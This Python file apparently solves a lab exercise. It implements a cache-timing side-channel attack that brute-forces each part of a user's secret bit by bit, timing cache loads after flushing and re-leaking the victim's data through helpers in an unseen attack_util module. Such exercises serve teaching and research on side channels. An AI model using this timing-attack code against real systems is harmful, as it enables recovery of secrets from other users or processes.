from tqdm import tqdm
from attack_util import *
from itertools import product


class HardAttacker(Attacker):
    MAX_CACHE_SIZE = 64
    DISPLAY_AMOUNT = 10
    DEFAULT_MEASURE_COUNT = 5
    
    def __init__(self, pedantic=False, reps=DEFAULT_MEASURE_COUNT, *args, **kwargs):
        self.pedantic = pedantic
        self.reps = reps
        super().__init__(*args, **kwargs)

    @staticmethod
    def _print_measurement_data(measurements):
        candidates = measurements.keys()
        fastest_times = {cand: min(cand_times) for cand, cand_times in measurements.items()}
        accumulated_times = {cand: sum(measurements[cand]) for cand in candidates}

        # printing extra info about results
        sum_sorted_candidates = sorted(candidates, key=lambda cand: accumulated_times[cand])
        fastest_sorted_candidates = sorted(candidates, key=lambda cand: fastest_times[cand])
        print(f"Top {HardAttacker.DISPLAY_AMOUNT} by fastest time were:")
        for cand in fastest_sorted_candidates[:HardAttacker.DISPLAY_AMOUNT]:
            print(f"Candidate: {cand}\t Fastest: {fastest_times[cand]:f} sec.\tMeasurements: {measurements[cand]}")
        print(f"Top {HardAttacker.DISPLAY_AMOUNT} by total time were:")
        for cand in sum_sorted_candidates[:HardAttacker.DISPLAY_AMOUNT]:
            print(f"Candidate: {cand}\t Total: {accumulated_times[cand]:f} sec.\tMeasurements: {measurements[cand]}")
    
    def find_part(self, part):
        candidates = [''.join(bits) for bits in product('01', repeat=PART_TO_BITLEN[part])]
        all_times = {cand: [] for cand in candidates}   # stores time records
        for rep in tqdm(range(self.reps), ascii=True, desc=f"Attacking {part.capitalize()}"):
            if rep == 0 or self.MAX_CACHE_SIZE >= len(candidates):
                # Optimization, no need to flush if old values will be evicted anyways
                self.flush_cache_from_part(part)
            
            for i, cand in enumerate(candidates):
                # ensures the part is always cached
                if i % self.MAX_CACHE_SIZE == 0:
                    self.leak_user_part_to_cache(part)
                
                all_times[cand].append(self.load_part_bits_to_cache(part, cand))

        fastest_times = {cand: min(cand_times) for cand, cand_times in all_times.items()}
        fastest_cand = min(candidates, key=lambda cand: fastest_times[cand])
        
        accumulated_times = {cand: sum(all_times[cand]) for cand in candidates}
        sum_best = min(candidates, key=lambda cand: accumulated_times[cand])

        if self.verbose:
            self._print_measurement_data(all_times)
        
        if self.pedantic and sum_best != fastest_cand:
            print("Indecisive Results, Retrying")
            return self.find_part(part)
        
        return sum_best

if __name__ == '__main__':
    print(HardAttacker.attack(verbose=True))